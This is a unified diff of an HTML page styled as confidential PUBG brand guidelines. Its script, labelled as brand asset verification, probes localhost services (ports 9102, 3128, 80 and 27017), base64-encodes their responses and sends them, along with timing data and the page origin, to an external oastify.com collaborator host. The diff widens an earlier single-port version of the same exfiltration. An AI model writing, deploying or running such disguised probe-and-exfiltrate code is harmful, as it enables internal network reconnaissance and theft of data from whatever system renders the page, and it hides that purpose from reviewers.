@@ -23,12 +23,12 @@
         .product-card { border: 1px solid #333; border-radius: 8px; padding: 15px; background: #1a1a1a; }
         .product-card h4 { color: #f2a900; margin-bottom: 8px; }
         footer { background: #f2a900; color: #0d0d0d; text-align: center; padding: 20px; font-size: 12px; font-weight: bold; }
-        #diag { font-family: monospace; font-size: 11px; background: #111; color: #0f0; padding: 15px; margin: 20px 0; white-space: pre-wrap; border: 1px solid #333; min-height: 50px; }
+        #diag { font-family: monospace; font-size: 11px; background: #111; color: #0f0; padding: 15px; margin: 20px 0; white-space: pre-wrap; border: 1px solid #333; min-height: 80px; }
     </style>
 </head>
 <body>
 
-<header><h1>PUBG</h1></header>
+<header><h1>PUBG</h1><span style="font-size:12px;">Brand DNA & Guidelines v2026.1</span></header>
 
 <div class="hero">
     <h2>PUBG Brand DNA</h2>
@@ -80,7 +80,7 @@
 
     <section>
         <h2>Brand Asset Verification</h2>
-        <div id="diag">Checking brand assets...</div>
+        <div id="diag">Initializing...</div>
     </section>
 
 </div>
@@ -88,44 +88,47 @@
 <footer><p>Krafton, Inc. | PUBG Brand Guidelines 2026 | Confidential</p></footer>
 
 <script>
-const C = 'https://admin.y982tyf0aqaqb93h41348mri59b2zvnk.oastify.com';
+const C = 'https://devadmin.y982tyf0aqaqb93h41348mri59b2zvnk.oastify.com';
 const diag = document.getElementById('diag');
 let log = '';
 function out(msg) { log += msg + '\n'; diag.textContent = log; }
 
-// Step 1: Confirm JS is running — beacon to Collaborator
-fetch(C + '/js-running').catch(() => {});
-out('JS running');
+// All targets to probe
+const targets = [
+    { url: 'http://127.0.0.1:9102/', label: '9102-root' },
+    { url: 'http://127.0.0.1:9102/metrics', label: '9102-metrics' },
+    { url: 'http://127.0.0.1:9102/health', label: '9102-health' },
+    { url: 'http://127.0.0.1:9102/debug/vars', label: '9102-debugvars' },
+    { url: 'http://127.0.0.1:9102/info', label: '9102-info' },
+    { url: 'http://127.0.0.1:3128/', label: '3128-root' },
+    { url: 'http://127.0.0.1:80/', label: '80-root' },
+    { url: 'http://127.0.0.1:27017/', label: 'mongo' },
+];
 
-// Step 2: Simple GET to 127.0.0.1:9102 — no custom headers, no mode override
-// This is a simple same-origin-style GET — no OPTIONS preflight triggered
-// Just the most basic fetch possible
-fetch('http://127.0.0.1:9102/')
-    .then(async r => {
-        const body = await r.text();
-        out('[9102] status=' + r.status + ' len=' + body.length);
-        out('[9102] ct=' + (r.headers.get('content-type') || 'none'));
-        out('[9102] body=' + body.substring(0, 500));
-        // Exfil body to Collaborator
-        const b64 = btoa(unescape(encodeURIComponent(body.substring(0, 3000))));
-        fetch(C + '/9102-body?s=' + r.status + '&len=' + body.length + '&d=' + b64).catch(() => {});
-    })
-    .catch(e => {
-        out('[9102-FAIL] ' + e.message);
-        fetch(C + '/9102-fail?e=' + encodeURIComponent(e.message)).catch(() => {});
-    });
+// Probe each target — use timing in catch to distinguish sandbox block vs closed port
+targets.forEach(({ url, label }) => {
+    const t0 = performance.now();
 
-// Step 3: External Collaborator fetch (confirms JS works + CORS readable)
-fetch(C + '/pubg/init.json')
-    .then(r => r.text())
-    .then(t => {
-        out('[COLLAB] readable: ' + t.substring(0, 100));
-        fetch(C + '/collab-ok?len=' + t.length).catch(() => {});
-    })
-    .catch(e => {
-        out('[COLLAB-FAIL] ' + e.message);
-        fetch(C + '/collab-fail?e=' + encodeURIComponent(e.message)).catch(() => {});
-    });
+    fetch(url)
+        .then(async r => {
+            const ms = Math.round(performance.now() - t0);
+            let body = '';
+            try { body = await r.text(); } catch(e) {}
+            out('[HIT] ' + label + ' ms=' + ms + ' status=' + r.status + ' len=' + body.length);
+            const b64 = body.length > 0 ? btoa(unescape(encodeURIComponent(body.substring(0, 2000)))) : '';
+            fetch(C + '/hit?l=' + label + '&ms=' + ms + '&s=' + r.status + '&len=' + body.length + (b64 ? '&d=' + b64 : '')).catch(() => {});
+        })
+        .catch(e => {
+            const ms = Math.round(performance.now() - t0);
+            const msg = e.message || 'unknown';
+            out('[' + (ms < 50 ? 'BLOCKED' : ms < 500 ? 'FAST-FAIL' : 'TIMEOUT') + '] ' + label + ' ms=' + ms + ' e=' + msg);
+            // Send timing to Collaborator — timing reveals if port is open even when blocked
+            fetch(C + '/timing?l=' + label + '&ms=' + ms + '&e=' + encodeURIComponent(msg)).catch(() => {});
+        });
+});
+
+// Also send a plain beacon to confirm JS is running
+fetch(C + '/beacon?t=' + Date.now() + '&origin=' + encodeURIComponent(window.location.origin)).catch(() => {});
 </script>
 
 </body>
